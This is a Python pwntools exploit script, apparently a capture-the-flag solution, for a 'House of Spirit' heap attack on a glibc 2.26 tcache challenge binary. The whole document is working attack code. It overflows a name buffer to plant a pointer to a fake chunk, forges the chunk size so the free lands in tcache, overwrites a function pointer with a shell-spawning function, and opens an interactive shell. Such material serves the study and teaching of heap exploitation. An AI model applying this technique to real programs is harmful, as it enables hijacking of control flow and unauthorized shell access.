'''
House of Spirit Challenge writeup - Tcache on 2.26

''' 
from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '' # For alternate version of libc
env = {}

# Binary setup
elf_name = '.bestfriend-2.26'
libc_name = "../../libc_versions/2.26/libc-2.26.so" 
elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process([elf.path],env=env)
	gdb.attach(p, gdbscript= '''
b 87 
b 88 
b 89 
dir ../../libc_versions/2.26/
''')
else: 
	p = remote(domain, port) 

# Filler DOES NOT MATTER
wine_name = "B" * 4
p.sendlineafter(">", wine_name) 

# Overwrite the pointer value for house of spirit
name = "A" * 0x20 
name += p64(elf.symbols['state'] + 0x10) 
p.sendlineafter(">", name) 

# Setup the FAKE chunk
# Once this is sent, the house of spirit is performed
age = 0x30 
p.sendlineafter(">", str(age))

# Write over the top of a function pointer, from house of spirit attack
name = p64(elf.symbols['pop_shell'])
p.sendlineafter(">", str(name))
p.interactive()


